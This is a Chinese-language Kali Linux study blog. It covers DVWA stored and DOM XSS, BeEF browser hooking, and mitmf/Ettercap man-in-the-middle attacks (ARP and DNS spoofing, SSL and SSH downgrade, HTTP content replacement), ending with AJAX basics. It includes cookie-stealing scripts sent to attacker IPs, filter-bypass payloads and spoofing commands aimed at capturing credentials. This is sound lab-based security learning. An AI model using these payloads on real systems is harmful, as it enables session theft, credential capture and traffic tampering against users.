&apos;&lt;pre&gt;&apos;;</span><br><span class="line">    echo &apos;Hello &apos; . htmlspecialchars($_GET[&apos;name&apos;]);</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="7-XSS-stored"><a href="#7-XSS-stored" class="headerlink" title="7. XSS stored"></a>7. XSS stored</h4><ul>
<li>存储型XSS<ul>
<li>长期存储于服务器端</li>
<li>每次用户访问都会被执行javascript脚本</li>
</ul>
</li>
<li>Name：客户端表单长度限制（好的Web Application同时在客户端和服务器端做长度限制）<ul>
<li>解除限制：浏览器客户端、截断代理</li>
</ul>
</li>
<li><code>&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></li>
<li>a.js源码（隐蔽性强）<ul>
<li>var img = new Image();</li>
<li>img src=”<a href="http://1.1.1.1/cookies.php?cookie=&quot;+document.cookie" target="_blank" rel="noopener">http://1.1.1.1/cookies.php?cookie=&quot;+document.cookie</a>;</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐js源码
1.kali，/var/www/html，vi a.js
2.var img = new Image();
3.img src=&quot;http://1.1.1.1:88/cookies.php?cookie=&quot;+document.cookie;（88端口为nc侦听端口）
4.service apache2 start
5.浏览器注入：&lt;script src=&quot;http://1.1.1.1/a.js&quot;&gt;&lt;/script&gt;</code></pre></blockquote>
<h4 id="8-XSS-stored–DVWA（▲-换不同安全级别的时候，需要清除数据库）"><a href="#8-XSS-stored–DVWA（▲-换不同安全级别的时候，需要清除数据库）" class="headerlink" title="8. XSS stored–DVWA（▲ 换不同安全级别的时候，需要清除数据库）"></a>8. XSS stored–DVWA（▲ 换不同安全级别的时候，需要清除数据库）</h4><ul>
<li>DVWA的XSS stored（&amp;message、Low）<ul>
<li>基本没有对&amp;message、&amp;name过滤，可实现任意注入</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $message = trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">   $name    = trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">   </span><br><span class="line">   // Sanitize message input</span><br><span class="line">   $message = stripslashes($message);</span><br><span class="line">   $message = mysql_real_escape_string($message);</span><br><span class="line">   </span><br><span class="line">   // Sanitize name input</span><br><span class="line">   $name = mysql_real_escape_string($name);</span><br><span class="line">  </span><br><span class="line">   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;);&quot;;</span><br><span class="line">   </span><br><span class="line">   $result = mysql_query($query) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>DVWA的XSS stored（Medium）<ul>
<li>绕过方法：&amp;message基本无法注入，&amp;name可以通过<code>&lt;scri&lt;script&gt;pt&gt;alert(&#39;xss&#39;);&lt;/scri&lt;script&gt;pt&gt;</code>绕过 ▲ 2020.1.20&amp;name不需要绕过注入</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $message = trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">   $name    = trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">   </span><br><span class="line">   // Sanitize message input</span><br><span class="line">   $message = trim(strip_tags(addslashes($message)));</span><br><span class="line">   $message = mysql_real_escape_string($message);</span><br><span class="line">   $message = htmlspecialchars($message);</span><br><span class="line">    </span><br><span class="line">   // Sanitize name input</span><br><span class="line">   $name = str_replace(&apos;&lt;script&gt;&apos;, &apos;&apos;, $name);</span><br><span class="line">   $name = mysql_real_escape_string($name);</span><br><span class="line">  </span><br><span class="line">   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;);&quot;;</span><br><span class="line">   </span><br><span class="line">   $result = mysql_query($query) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>DVWA的XSS stored（High）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;btnSign&apos;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   $message = trim($_POST[&apos;mtxMessage&apos;]);</span><br><span class="line">   $name    = trim($_POST[&apos;txtName&apos;]);</span><br><span class="line">   </span><br><span class="line">   // Sanitize message input</span><br><span class="line">   $message = stripslashes($message);</span><br><span class="line">   $message = mysql_real_escape_string($message);</span><br><span class="line">   $message = htmlspecialchars($message);</span><br><span class="line">   </span><br><span class="line">   // Sanitize name input</span><br><span class="line">   $name = stripslashes($name);</span><br><span class="line">   $name = mysql_real_escape_string($name); </span><br><span class="line">   $name = htmlspecialchars($name);</span><br><span class="line">  </span><br><span class="line">   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&apos;$message&apos;,&apos;$name&apos;);&quot;;</span><br><span class="line">   </span><br><span class="line">   $result = mysql_query($query) or die(&apos;&lt;pre&gt;&apos; . mysql_error() . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="9-XSS-DOM"><a href="#9-XSS-DOM" class="headerlink" title="9. XSS DOM"></a>9. XSS DOM</h4><ul>
<li>DOM型XSS<ul>
<li>一套JS和其他语言可调用的标准的API</li>
</ul>
</li>
</ul>
<p><img src="http://www.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=f66f-xKTDzcuepCGP1R9qnf5yzSEpWewBDFOJ4ZgiR74rXX7YTpJS9ZthPIXIwy-zMuvL6LE6JC52VMb9VnTpLNb9_SrR8jGaoghAOmTQyKrlr9h6MCdKg&file_name=/XSS-DOM.PNG" alt="DOM型XSS"></p>
<ul>
<li><code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http:// 192.168.20.8:88/log?&quot;+escape(document.cookie);&lt;/script&gt;</code></li>
</ul>
<h4 id="10-BEEF"><a href="#10-BEEF" class="headerlink" title="10. BEEF"></a>10. BEEF</h4><ul>
<li>浏览器攻击面（不可忽视，基本上最接近用户）<ul>
<li>应用普遍转移到B/S架构，浏览器成为统一客户端程序</li>
<li>结合社会工程学方法对浏览器进行攻击</li>
<li>攻击浏览器用户</li>
<li>通过注入的JS脚本，利用浏览器攻击其他网站</li>
</ul>
</li>
<li>BeFF（Browser exploitation framework）<ul>
<li>生成、交付payload</li>
<li>Ruby语言编写</li>
<li>服务器端：管理hooked客户端</li>
<li>客户端：运行客户端浏览器的Javascript脚本（hook）</li>
</ul>
</li>
<li>攻击手段<ul>
<li>利用网站XSS漏洞实现攻击</li>
<li>诱使客户端访问含有hook的伪造站点</li>
<li>结合中间人攻击注入hook脚本</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐中间人攻击/劫持
运行商：链路劫持，插入js脚本，来宣传广告，黑色收入
Hacker：CDN劫持，在CDN节点上插入js脚本</code></pre></blockquote>
<ul>
<li>常见用途<ul>
<li>键盘记录器</li>
<li>网络扫描</li>
<li>浏览器信息收集</li>
<li>绑定shell</li>
<li>与metasploit集成</li>
</ul>
</li>
<li>演示页面：http://<IP_BeEF_Server>:3000/demos/basic.html</li>
<li>hook.js：<a href="http://127.0.0.1:3000/hook.js" target="_blank" rel="noopener">http://127.0.0.1:3000/hook.js</a></li>
<li>BeEF登陆界面：username:beef/password:beef ▲ 2020.1.20修改密码为admin</li>
<li>BeEF用户界面：<a href="http://127.0.0.1:3000/ul/panel" target="_blank" rel="noopener">http://127.0.0.1:3000/ul/panel</a></li>
<li>DVWA的XSS stored（$name进行hook，$message不注入）</li>
<li>Details：<ul>
<li>浏览器、插件版本信息；操作系统信息</li>
</ul>
</li>
<li>Logs：<ul>
<li>浏览器动作：焦点变化、鼠标点击、信息输入</li>
</ul>
</li>
<li>Commands：命令模块<ul>
<li>绿色模块：表示模块适合目标浏览器，并且执行结果被客户端不可见</li>
<li>红色模块：表示模块不适合当前用户，有些红色模块也可以正常执行</li>
<li>橙色模块：模块可用，但结果对用户可见（CAM弹窗申请权限等）</li>
<li>灰色模块：模块未在目标浏览器上测试过</li>
</ul>
</li>
<li>主要模块<ul>
<li>Browsers</li>
<li>Exploits</li>
<li>Host</li>
<li>Persistence（持久性）</li>
<li>Network</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AB)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E6%B3%A8%E5%85%A5XSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AB)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E6%B3%A8%E5%85%A5XSS/" itemprop="url">Kali Linux笔记(五十八)：SSL、TLS中间人攻击--注入XSS</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-中间人攻击（注入XSS）"><a href="#1-中间人攻击（注入XSS）" class="headerlink" title="1. 中间人攻击（注入XSS）"></a>1. 中间人攻击（注入XSS）</h4><ul>
<li>注入XSS<ul>
<li>结合ARP欺骗或DNS代理欺骗，实现中间人攻击</li>
<li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码 </li>
<li>一旦得手，影响范围巨大 </li>
<li>如果中间人发生在运营商线路上，很难引起用户注意，隐蔽性高 </li>
</ul>
</li>
</ul>
<h4 id="2-中间人攻击–Mitmf-Beef"><a href="#2-中间人攻击–Mitmf-Beef" class="headerlink" title="2. 中间人攻击–Mitmf*Beef"></a>2. 中间人攻击–Mitmf*Beef</h4><ul>
<li>Mitmf 安装（无核心技术内容，冗杂性大）▲ 2020.1.24一些依赖包以及安装包无法找到<ul>
<li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装） </li>
<li><strong><code>🔺命令：apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</code></strong> </li>
<li><strong><code>🔺命令：apt-get install mitmf</code></strong> </li>
<li><strong><code>🔺命令：pip uninstall twisted</code></strong> </li>
<li><strong><code>🔺命令：wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted15.5.0.tar.bz2</code></strong> </li>
<li><strong><code>🔺命令：pip install ./Twisted-15.5.0.tar.bz2</code></strong></li>
</ul>
</li>
<li>启动beef <ul>
<li><strong><code>🔺命令：cd /usr/share/beef-xss/</code></strong> </li>
<li><strong><code>🔺命令：./beef</code></strong> ▲ 2020.1.24修改为beef-xss（命令存在Bash中）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（结合Beef）<ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 1.1.1.1（正确网关地址） --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js</code></strong> （ARP地址欺骗）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（不结合Beef） <ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</code></strong>（ARP地址欺骗）</li>
<li>–upsidedownternet（图片倒转）、–screen（/var/log/mitmf，屏幕快照） </li>
<li>–ferretng（抓取cookie）、–browserprofiler（浏览器及插件信息） </li>
<li>–smbtrap（抓取smb）、–smbauth（smb认证）</li>
<li>–hsts（新的安全协议）<ul>
<li>HTTP Strict Transport Security </li>
<li>防止协议降级、cookie窃取 </li>
<li>安全策略通过HTTP响应头”Strict-Transport-Security”实施 </li>
<li>限制user-agent、https等</li>
</ul>
</li>
<li>–filepwn（EXE执行程序的下载，插入后门程序）<ul>
<li>凌空插后门 </li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-中间人攻击–Ettercap"><a href="#3-中间人攻击–Ettercap" class="headerlink" title="3. 中间人攻击–Ettercap"></a>3. 中间人攻击–Ettercap</h4><ul>
<li>Ettercap ▲ 2020.1.24Ettercap有点小问题，关于主机发现这一模块<ul>
<li>统一的中间人攻击工具 </li>
<li>转发MAC与本机相同，但IP与本机不同的数据包 </li>
<li>支持SSH1、SSL中间人攻击</li>
</ul>
</li>
<li>模块划分 <ul>
<li>Snifer </li>
<li>MITM </li>
<li>Filter </li>
<li>Log </li>
<li>Plugin</li>
</ul>
</li>
</ul>
<h4 id="4-Ettercap–Snifer"><a href="#4-Ettercap–Snifer" class="headerlink" title="4. Ettercap–Snifer"></a>4. Ettercap–Snifer</h4><ul>
<li>Snifer<ul>
<li>负责数据包转发</li>
<li>Unified<ul>
<li>单网卡情况下独立完成三层包转发</li>
<li>始终禁用内核IP_Forward功能</li>
</ul>
</li>
<li>Bridge <ul>
<li>双网卡情况下的一层MITM模式</li>
<li>可作为IPS过滤数据包</li>
<li>不可在网关上使用（透明网桥）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-Ettercap–MITM"><a href="#5-Ettercap–MITM" class="headerlink" title="5. Ettercap–MITM"></a>5. Ettercap–MITM</h4><ul>
<li>MITM <ul>
<li>把流量重定向到ettercap主机上 </li>
<li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li>
</ul>
</li>
<li>实现MITM的方法 <ul>
<li>ARP（一般为动态类型的ARP表）</li>
<li>ICMP <ul>
<li>ICMP路由重定向，半双工，回包不经过Kali（去包回包都经过Kali为全双工）</li>
<li>-M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</li>
</ul>
</li>
<li>DHCP <ul>
<li>修改网关地址，半双工，回包不经过Kali</li>
<li>DHCP发包过程Discover、Offer、Resquest、ACK</li>
<li>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</li>
</ul>
</li>
<li>Switch Port Stealing（交换机端口窃取）<ul>
<li>交换机根据源MAC地址更新</li>
<li>flood目标地址是本机，源地址是受害者的包（向交换机发送大量泛洪攻击）</li>
<li>适用于ARP静态绑定的环境（arp -s → 添加静态绑定的ARP）</li>
<li>-M port /1.1.1.1/ /1.1.1.2/ </li>
</ul>
</li>
<li>NDP <ul>
<li>IPv6协议欺骗技术</li>
<li>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li>
</ul>
</li>
</ul>
</li>
<li>Linux2.4以上内核对ARP地址欺骗的约束 <ul>
<li>收到非请求的ARP响应包，不更新本地ARP缓存 </li>
<li>Ettercap使用ARP request包进行攻击 </li>
</ul>
</li>
<li>Solaris不根据ARP包更新本地ARP缓存 <ul>
<li>Ettercap使用先发ICMP包来更新ARP缓存</li>
</ul>
</li>
</ul>
<h4 id="6-Ettercap–准备"><a href="#6-Ettercap–准备" class="headerlink" title="6. Ettercap–准备"></a>6. Ettercap–准备</h4><ul>
<li>用户操作界面 <ul>
<li>-T 文本界面（文本字符）</li>
<li>-G 图形界面 </li>
<li>-C 基于文本的图形界面（文本类似图形化）</li>
<li>-D 后台模式 </li>
</ul>
</li>
<li>指定目标 <ul>
<li>IPv4：MAC/IPv4/Ports </li>
<li>IPv6：MAC/IPv4/IPv6/Ports </li>
<li>/10.0.0.1−5;10.0.1.33/20−25,80,110</li>
</ul>
</li>
<li>权限 <ul>
<li>主配置文件：/etc/ettercap/etter.conf</li>
<li>需要root权限打开链路层Socket连接，然后使用nobody账号运行 </li>
<li>日志写入目录需要nobody有写入权 </li>
<li>修改etter.conf：EC_UID=65534/EC_GID=65534 → EC_UID=0/EC_GID=0</li>
</ul>
</li>
<li>基于伪造证书的SSL MITIM <ul>
<li>Bridge模式不支持SSL MITM ▲ 2020.1.24报额外参数的错误</li>
<li><strong><code>🔺命令：openssl genrsa −out etter.ssl.crt 1024</code></strong> </li>
<li><strong><code>🔺命令：openssl req −new−keyetter.ssl.crt −out tmp.csr</code></strong> </li>
<li><strong><code>🔺命令：openssl x509 −req −days 1825 −in tmp.csr −signkey etter.ssl.crt −out tmp.new</code></strong> </li>
<li><strong><code>🔺命令：cat tmp.new&gt;&gt;etter.ssl.crt</code></strong></li>
<li><strong><code>🔺命令：rm −f tmp.newtmp.csr</code></strong></li>
</ul>
</li>
</ul>
<h4 id="7-Ettercap–字符模式"><a href="#7-Ettercap–字符模式" class="headerlink" title="7. Ettercap–字符模式"></a>7. Ettercap–字符模式</h4><ul>
<li>参数<ul>
<li>-M（MITM技术）</li>
<li>-F（过滤器）</li>
<li>-P（模块）</li>
<li>-w（网络流量记录）</li>
<li>-l（简单记录日志）</li>
<li>-L（记录所有日志信息）</li>
<li>-m（账号密码信息）</li>
<li>-q（安静模式/有用的信息）</li>
</ul>
</li>
<li>MITM攻击<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></strong></li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap字符界面</li>
</ul>
</li>
<li>Ettercap 日志查看 ▲ 2020.1.24查看无权限<ul>
<li><strong><code>🔺命令：cat message</code></strong>（root目录下）</li>
<li><strong><code>🔺命令：ls log发现文件是加密信息</code></strong></li>
<li><strong><code>🔺命令：etterlog -p log.eci 查看获取的密码</code></strong></li>
<li><strong><code>🔺命令：etterlog -c log.ecp 列出Log中的连接</code></strong></li>
<li><strong><code>🔺命令：etterlog -c -f //1.1.1.1/ log.ecp</code></strong></li>
<li><strong><code>🔺命令：etterlog -B -n -s -F TCP:1.1.1.1:20;1.1.1.2:1234 log.ecp &gt; aa 选择相应的连接并榨取文件</code></strong></li>
</ul>
</li>
</ul>
<h4 id="8-Ettercap–图形界面"><a href="#8-Ettercap–图形界面" class="headerlink" title="8. Ettercap–图形界面"></a>8. Ettercap–图形界面</h4><ul>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
<h4 id="9-Ettercap–SSL中间人攻击"><a href="#9-Ettercap–SSL中间人攻击" class="headerlink" title="9. Ettercap–SSL中间人攻击"></a>9. Ettercap–SSL中间人攻击</h4><ul>
<li>SSL MITM（默认无开启，需要在配置文件中修改，图形界面）<ul>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.conf</code></strong>（Linux → The second iptables）</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
</ul>
<h4 id="10-Ettercap–DNS欺骗"><a href="#10-Ettercap–DNS欺骗" class="headerlink" title="10. Ettercap–DNS欺骗"></a>10. Ettercap–DNS欺骗</h4><ul>
<li>DNS欺骗（图形界面） <ul>
<li>dns_spoof插件配置文件 </li>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.dns</code></strong>（修改欺骗的域名对应的IP地址）</li>
<li>Plugins → Load a plugins → Load ec_dns_spoof.so</li>
<li>Plugins → Manage the plugins → 双击dns_spoof启动</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
<li>DNS欺骗（字符界面）<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -P dns_spoof</code></strong></li>
<li><strong><code>🔺命令：ipconfig /flushdns</code></strong></li>
<li><strong><code>🔺命令：ping 欺骗的域名</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-Ettercap–Filter"><a href="#11-Ettercap–Filter" class="headerlink" title="11. Ettercap–Filter"></a>11. Ettercap–Filter</h4><ul>
<li>Filter <ul>
<li>/usr/share/ettercap/</li>
<li>▲ SSH-2.xx / SSH-1.99（既支持SSH-1，也支持SSH-2） / SSH-1.51</li>
<li>etter.filter.ssh（ssh过滤文件，把SSH-2.xx/SSH-1.99转变为SSH-1.51）</li>
<li><strong><code>🔺命令：etterfilter etter.filter.ssh -o ssh.ef</code></strong></li>
<li><strong><code>🔺命令：mv ssh.ef /root</code></strong></li>
<li>直接调用 -F ssh.ef（若发送SSH-1.99，则降级SSH-1.99为SSH-1.51）</li>
</ul>
</li>
<li>替换HTTP内容（图片的内容可以替换为一个EXE或者脚本文件）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123; </span><br><span class="line">     msg(&quot;data on TCP 80\n&quot;); </span><br><span class="line">         replace(&quot;img src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); </span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%83)%EF%BC%9AAJAX%E3%80%81Web%20Server/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%83)%EF%BC%9AAJAX%E3%80%81Web%20Server/" itemprop="url">Kali Linux笔记(五十七)：AJAX、Web Server</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T08:34:39+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-AJAX"><a href="#1-AJAX" class="headerlink" title="1. AJAX"></a>1. AJAX</h4><ul>
<li>Asynchronous JavaScript and XML</li>
<li>是一个概念，而非一种新的编程语言，是一组现有技术的组合</li>
<li>通过客户端脚本动态更新页面部分内容，而非整个页面</li>
<li>降低带宽使用，提高速度</li>
<li>提升用户体验</li>
<li>后台异步访问</li>
</ul>
<h4 id="2-AJAX、DHTML、DOM"><a href="#2-AJAX、DHTML、DOM" class="headerlink" title="2. AJAX、DHTML、DOM"></a>2. AJAX、DHTML、DOM</h4><ul>
<li>AJAX组件<ul>
<li>JavaScript：ajax的核心组件，使用XMLHTTPRequest对象接口向服务器发起请求，接收并处理服务器响应数据</li>
</ul>
</li>
<li>Dynamic HTML（DHTML）<ul>
<li>早于AJAX出现，通过javascript、CSS等在客户端修改HTML页面element，缺点是完全依赖客户端代码修改页面，与服务器的交互由javascript applets完成，AJAX的XHR弥补了他的缺点（注册用户）</li>
</ul>
</li>
<li>Document Object Model（DOM）<ul>
<li>处理html、xml文档对象的框架，DHTML是一个浏览器，DOM作为其一个实现的接口，定义和管理每个页面元素obj的Properties、method、event</li>
</ul>
</li>
</ul>
<h4 id="3-基于AJAX的WEB应用工作流程"><a href="#3-基于AJAX的WEB应用工作流程" class="headerlink" title="3. 基于AJAX的WEB应用工作流程"></a>3. 基于AJAX的WEB应用工作流程</h4><ul>
<li>XMLHTTPRequest API创建对象xmlhttp进行访问</li>
<li>Xml、json（默认首选）、html、文本、图片</li>
<li>多个异步请求独立通信，互不依赖</li>
<li>AJAX框架<ul>
<li>JQuery</li>
<li>Dojo Toolkit</li>
<li>Google web toolkit（GWT）</li>
<li>Microsoft AJAX library</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐请求过程：User Interface →(JavaScript)→ AJAX Engine →(HTTP Request)→ Web Server → Database,backend server
